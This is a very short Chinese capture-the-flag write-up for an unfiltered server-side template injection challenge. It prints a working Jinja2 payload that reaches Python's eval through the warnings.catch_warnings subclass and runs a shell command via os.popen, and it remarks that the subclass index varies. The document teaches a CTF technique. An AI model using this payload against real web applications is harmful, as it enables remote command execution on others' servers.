### `0x00` 题解

没有任何过滤的`SSTI`，直接找到`warnings.catch_warnings`拿下就可以了。

```data
{{[].__class__.__base__.__subclasses__()[110].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
```

![image-20210219081903832](https://i.loli.net/2021/02/19/Fjgk9cJRVAb62uz.png)

PS: 照抄`payload`不一定可以用，这里用了`warnings.catch_warnings`这个类的位置会变化的。